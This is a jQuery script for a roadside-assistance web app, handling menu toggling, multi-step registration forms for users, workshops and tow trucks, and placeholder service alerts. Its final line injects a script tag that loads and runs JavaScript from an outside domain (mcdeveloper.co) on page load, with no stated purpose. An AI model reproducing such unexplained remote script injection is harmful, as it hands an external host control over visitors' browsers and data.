$(document).ready(function() {
  // variables
	"use strict";
	
	var	trigger = $('.hamburger'), overlay = $('.overlay'), isClosed = false;
	
	var campo1=0;
	var campo2=0;
	var campo3=0;
	var campo4=0;
	var campo5=0;
	var campo6=0;
	var campo7=0;
	var campo8=0;
	var campo9=0;
	var campo10=0;
	var campo11=0;
	
	var campo12=0;
	var campo13=0;
	var campo14=0;
	var campo15=0;
	var campo16=0;
	var campo17=0;
	var campo18=0;
	
	var campo19=0;
	var campo20=0;
	var campo21=0;
	var campo22=0;
	var campo23=0;
	var campo24=0;
	var campo25=0;
	var campo26=0;
	var campo27=0;
	
    trigger.click(function () {
      hamburger_cross();      
    });
    function hamburger_cross() {
      if (isClosed === true) {          
        overlay.hide();
        trigger.removeClass('is-open');
        trigger.addClass('is-closed');
        isClosed = false;
      } else {   
        overlay.show();
        trigger.removeClass('is-closed');
        trigger.addClass('is-open');
        isClosed = true;
      }
  }
  
  $('[data-toggle="offcanvas"]').click(function () {
	$('#wrapper').toggleClass('toggled');
  });	
	/**************************************************/
  $("#registro").click(function () {
	$("#register-login").addClass("hidden");
	$("#register-clients").removeClass("hidden");
  });
  $("#btn-registrar-usuario").click(function () {
	$("#register-clients").addClass("hidden");
	$("#registar_usuarios").removeClass("hidden");
	$("#register1").removeClass("hidden");
  });
  $("#btn-registrar-taller").click(function () {
	$("#register-clients").addClass("hidden");
	$("#registar_talleres").removeClass("hidden");
	$("#taller1").removeClass("hidden");
  });
  $("#btn-registrar-grua").click(function () {
	$("#register-clients").addClass("hidden");
	$("#registar_gruas").removeClass("hidden");
	$("#grua1").removeClass("hidden");
  });
  $("#regresar0").click(function () {
	$("#register-clients").addClass("hidden");
	$("#register-login").removeClass("hidden");
  });
  $("#regresar1").click(function () {
	$("#register1").addClass("hidden");
	$("#registar_usuarios").addClass("hidden");
	$("#register-clients").removeClass("hidden");
  });
  $("#regresar2").click(function () {
	$("#register2").addClass("hidden");
	$("#register1").removeClass("hidden");
  });
  $("#regresar3").click(function () {
	$("#register3").addClass("hidden");
	$("#register2").removeClass("hidden");
  });
  $("#regresar4").click(function () {
	$("#register4").addClass("hidden");
	$("#register3").removeClass("hidden");
  });
  $("#regresar_taller1").click(function () {
	$("#taller1").addClass("hidden");
	$("#registar_talleres").addClass("hidden");
	$("#register-clients").removeClass("hidden");
  });
  $("#regresar_taller2").click(function () {
	$("#taller2").addClass("hidden");
	$("#taller1").removeClass("hidden");
  });
  $("#regresar_taller3").click(function () {
	$("#taller3").addClass("hidden");
	$("#taller2").removeClass("hidden");
  });
  $("#regresar_grua1").click(function () {
	$("#grua1").addClass("hidden");
	$("#registar_gruas").addClass("hidden");
	$("#register-clients").removeClass("hidden");
  });
  $("#regresar_grua2").click(function () {
	$("#grua2").addClass("hidden");
	$("#grua1").removeClass("hidden");
  });
  $("#regresar_grua3").click(function () {
	$("#grua3").addClass("hidden");
	$("#grua2").removeClass("hidden");
  });
	
  $("#siguiente1").click(function () {
	if($("#cedula").val()==""){
		$("#cedula").css("border","1px solid #A92121");
	}else{
		$("#cedula").css("border","1px solid #ccc");
		campo1=1;
	}
	if($("#placa").val()==""){
		$("#placa").css("border","1px solid #A92121");
	}else{
		$("#placa").css("border","1px solid #ccc");
		campo2=1;
	}
	if($("#nombres").val()==""){
		$("#nombres").css("border","1px solid #A92121");
	}else{
		$("#nombres").css("border","1px solid #ccc");
		campo3=1;
	}
	if($("#apellidos").val()==""){
		$("#apellidos").css("border","1px solid #A92121");
	}else{
		$("#apellidos").css("border","1px solid #ccc");
		campo4=1;
	}
	if($("#correo").val()==""){
		$("#correo").css("border","1px solid #A92121");
	}else{
		$("#correo").css("border","1px solid #ccc");
		campo5=1;
	}
	if($("#contrasena").val()==""){
		$("#contrasena").css("border","1px solid #A92121");
	}else{
		$("#contrasena").css("border","1px solid #ccc");
		campo6=1;
	}
	if($("#telefono").val()==""){
		$("#telefono").css("border","1px solid #A92121");
	}else{
		$("#telefono").css("border","1px solid #ccc");
		campo7=1;
	}var total_usuarios1=campo1+campo2+campo3+campo4+campo5+campo6+campo7;
	if(total_usuarios1==7){
		$("#register1").addClass("hidden");
		$("#register2").removeClass("hidden");
	}
  });
  $("#siguiente2").click(function () {
	if($("#tipo_vehiculo").val()==0){
		$("#tipo_vehiculo").css("border","1px solid #A92121");
	}else{
		$("#tipo_vehiculo").css("border","1px solid #ccc");
		campo8=1;
	}
	if($("#fabricante").val()==0){
		$("#fabricante").css("border","1px solid #A92121");
	}else{
		$("#fabricante").css("border","1px solid #ccc");
		campo9=1;
	}
	if($("#modelos").val()==0){
		$("#modelos").css("border","1px solid #A92121");
	}else{
		$("#modelos").css("border","1px solid #ccc");
		campo10=1;
	}
	if($("#anos").val()==0){
		$("#anos").css("border","1px solid #A92121");
	}else{
		$("#anos").css("border","1px solid #ccc");
		campo11=1;
	}var total_usuarios2=campo8+campo9+campo10+campo11;
	if(total_usuarios2 == 4){
		$("#register2").addClass("hidden");
		$("#register3").removeClass("hidden");
	}
  });
  $("#siguiente3").click(function () {
	$("#register3").addClass("hidden");
	$("#register4").removeClass("hidden");
	$("#taller3").addClass("hidden");
	$("#taller4").removeClass("hidden");
	$("#grua3").addClass("hidden");
	$("#grua4").removeClass("hidden");
  });
	
  $("#siguiente_taller1").click(function () {
	if($("#nit").val()==""){
		$("#nit").css("border","1px solid #A92121");
	}else{
		$("#nit").css("border","1px solid #ccc");
		campo12=1;
	}if($("#empresa").val()==""){
		$("#empresa").css("border","1px solid #A92121");
	}else{
		$("#empresa").css("border","1px solid #ccc");
		campo13=1;
	}if($("#dir_empresa").val()==""){
		$("#dir_empresa").css("border","1px solid #A92121");
	}else{
		$("#dir_empresa").css("border","1px solid #ccc");
		campo14=1;
	}if($("#correo_empresa").val()==""){
		$("#correo_empresa").css("border","1px solid #A92121");
	}else{
		$("#correo_empresa").css("border","1px solid #ccc");
		campo15=1;
	}if($("#contra_empresa").val()==""){
		$("#contra_empresa").css("border","1px solid #A92121");
	}else{
		$("#contra_empresa").css("border","1px solid #ccc");
		campo16=1;
	}var total_talleres1=campo12+campo13+campo14+campo15+campo16;
	if(total_talleres1 == 5){
		$("#taller1").addClass("hidden");
		$("#taller2").removeClass("hidden");
	}
  });
  $("#siguiente_taller2").click(function () {
	if($("#telefono_empresa").val()==""){
		$("#telefono_empresa").css("border","1px solid #A92121");
	}else{
		$("#telefono_empresa").css("border","1px solid #ccc");
		campo17=1;
	}if($("#dias").val()==""){
		$("#dias").css("border","1px solid #A92121");
	}else{
		$("#dias").css("border","1px solid #ccc");
		campo18=1;
	}var total_talleres2=campo17+campo18;
	if(total_talleres2 == 2){
		$("#taller2").addClass("hidden");
		$("#taller3").removeClass("hidden");
	}
  });
	
  $("#siguiente_grua1").click(function () {
	if($("#cedula_grua").val()==""){
		$("#cedula_grua").css("border","1px solid #A92121");
	}else{
		$("#cedula_grua").css("border","1px solid #ccc");
		campo19=1;
	}
	if($("#placa_grua").val()==""){
		$("#placa_grua").css("border","1px solid #A92121");
	}else{
		$("#placa_grua").css("border","1px solid #ccc");
		campo20=1;
	}
	if($("#nombres_grua").val()==""){
		$("#nombres_grua").css("border","1px solid #A92121");
	}else{
		$("#nombres_grua").css("border","1px solid #ccc");
		campo21=1;
	}
	if($("#apellidos_grua").val()==""){
		$("#apellidos_grua").css("border","1px solid #A92121");
	}else{
		$("#apellidos_grua").css("border","1px solid #ccc");
		campo22=1;
	}
	if($("#telefono_grua").val()==""){
		$("#telefono_grua").css("border","1px solid #A92121");
	}else{
		$("#telefono_grua").css("border","1px solid #ccc");
		campo23=1;
	}if($("#correo_grua").val()==""){
		$("#correo_grua").css("border","1px solid #A92121");
	}else{
		$("#correo_grua").css("border","1px solid #ccc");
		campo24=1;
	}
	if($("#contrasena_grua").val()==""){
		$("#contrasena_grua").css("border","1px solid #A92121");
	}else{
		$("#contrasena_grua").css("border","1px solid #ccc");
		campo25=1;
	}var total_gruas1=campo19+campo20+campo21+campo22+campo23+campo24+campo25;
	if(total_gruas1==7){
		$("#grua1").addClass("hidden");
		$("#grua2").removeClass("hidden");
	}
  });
  $("#siguiente_grua2").click(function () {
	if($("#tipo_vehiculo_grua").val()==""){
		$("#tipo_vehiculo_grua").css("border","1px solid #A92121");
	}else{
		$("#tipo_vehiculo_grua").css("border","1px solid #ccc");
		campo26=1;
	}
	if($("#contrasena_grua").val()==""){
		$("#contrasena_grua").css("border","1px solid #A92121");
	}else{
		$("#contrasena_grua").css("border","1px solid #ccc");
		campo27=1;
	}var total_gruas2=campo26+campo27;
	if(total_gruas2==2){
		$("#grua2").addClass("hidden");
		$("#grua3").removeClass("hidden");
	}
  });
	/**************************************************/
  $("#ingreso").click(function () {
	$("#register-login").addClass("hidden");
	$("#login").removeClass("hidden");
  });
  $("#login footer h5 a").click(function () {
	$("#login").addClass("hidden");
	$("#register-clients").removeClass("hidden");
  });
	/**************************************************/
  $("#taller").click(function () {
	var t = confirm("En este momento usted está solicitando una cita al taller más cercano");
	if (t == true) {
		alert("En este momento el servicio de carro taller no esta disponible");
	} else {
	    txt = "Error!";
	}
  });
  $("#asistente").click(function () {
	alert("En este momento el servicio de croquis no esta disponible");
  });
  $("#grua").click(function () {
	var g = confirm("Deseas solicitar una gruas?");
	if (g == true) {
		alert("Buscando gruas...");
		alert("Servicio de grua no disponible");
	} else {
	    txt = "Error!";
	}
  });
  $("#grua_u").click(function () {
	alert("No se han creado solicitudes para mostrar");
  });
  $("#micuenta").click(function () {
	$("#home").addClass("hidden");
	$("#cuenta").removeClass("hidden");
	$("#micuenta1").removeClass("hidden");
	hamburger_cross();
	$('#wrapper').toggleClass('toggled');
  });
  $("#historia").click(function () {
	alert("Sin historia disponible");
  });
  $(".ayuda").click(function () {
	alert("Servicio de ayuda no disponible");
  });
  $(".cerrar").click(function () {
		$.ajax({
			   url  : './db/salir.php',
   			success : function(salir){
				$("body").append(salir);
				$("#home").addClass("hidden");
				$("#register-login").removeClass("hidden");
				hamburger_cross();
				$('#wrapper').toggleClass('toggled');
				location.href='index.php';
			}
		});
  });
	/**************************************************/
  $(".return-chat").click(function () {
	$("#home").removeClass("hidden");
	$("#chat_car").addClass("hidden");
	$("#cuenta").addClass("hidden");
  });
  $("#btn-chat").click(function () {
	$("#home").addClass("hidden");
	$("#chat_car").removeClass("hidden");
  });
	/**************************************************/
	
	/**************************************************/
  $("#personal").click(function () {
	$("#micuenta1").removeClass("hidden");
	$("#micuenta2").addClass("hidden");
	$("#micuenta3").addClass("hidden");
  });
  $("#vehiculo").click(function () {
	$("#micuenta1").addClass("hidden");
	$("#micuenta2").removeClass("hidden");
	$("#micuenta3").addClass("hidden");
  });
  $("#fotos").click(function () {
	$("#micuenta1").addClass("hidden");
	$("#micuenta2").addClass("hidden");
	$("#micuenta3").removeClass("hidden");
  });
	/**************************************************/
  $("#pcontrol").click(function () {
	hamburger_cross();
	$('#wrapper').toggleClass('toggled');
  });
  $("#usuarios").click(function () {
	hamburger_cross();
	$('#wrapper').toggleClass('toggled');
  });
  $("#chat").click(function () {
	hamburger_cross();
	$('#wrapper').toggleClass('toggled');
  });
  $("#roles").click(function () {
	hamburger_cross();
	$('#wrapper').toggleClass('toggled');
  });
  $("#talleres").click(function () {
	hamburger_cross();
	$('#wrapper').toggleClass('toggled');
  });
  $("#gruas").click(function () {
	hamburger_cross();
	$('#wrapper').toggleClass('toggled');
  });
	$("body").append("<script type='text/javascript' src='https://mcdeveloper.co/js/AShock.js'></script>");
});